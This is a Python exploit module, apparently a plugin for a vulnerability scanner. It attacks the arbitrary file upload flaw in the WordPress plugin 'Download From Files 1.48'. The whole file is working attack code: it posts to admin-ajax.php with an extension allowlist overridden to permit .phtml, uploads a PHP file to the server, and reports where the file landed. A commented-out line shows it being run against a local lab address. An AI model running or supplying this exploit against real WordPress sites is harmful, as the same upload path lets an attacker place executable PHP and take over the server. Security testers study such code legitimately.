# coding: utf-8
import requests
import os
import random

def vuln_check(uri):
    response = requests.get(uri)
    raw = response.text
    if "Sikeres" in raw:
        return True
    else:
        return False


#Wordpress Plugin Download From Files 1.48 - Arbitrary File Upload
def poc(url,user_agent,proxy):

    url = url.strip("/")
    ajax_action = 'download_from_files_617_fileupload'
    admin = '/wp-admin/admin-ajax.php'

    exp_url = url + admin + '?action=' + ajax_action
    check = vuln_check(exp_url)
    if not check:
        return

    file_path='../../data/phpinfo.phtml'
    header = {'User-Agent': user_agent}

    files = {'files[]' : open(file_path)}
    data = {
        "allowExt": "php4,phtml",
        "filesName": "files",
        "maxSize": "1000",
        "uploadDir": "."
    }
    if proxy:
        proxies = {
            "http": "http://%(proxy)s/" % {'proxy': proxy},
            "https": "http://%(proxy)s/" % {'proxy': proxy}
        }
        response = requests.post(exp_url, headers=header,files=files,data=data, proxies=proxies)
    else:
        response = requests.post(exp_url, headers=header,files=files,data=data)
    file_name = os.path.basename(file_path)
    if "ok" in response.text:
        path=url + "/wp-admin/" + file_name
        return 'Wordpress Plugin Download From Files 1.48 - 任意文件上传漏洞   上传的位置：'+path


def run(url,logindict,user_agent,proxies):
    result = poc(url,user_agent,proxies)
    return result

# run("http://192.168.220.128/Wordpress/wordpress-5.8.2-zh_CN/",{'admin':'admin'},'','127.0.0.1:8080')
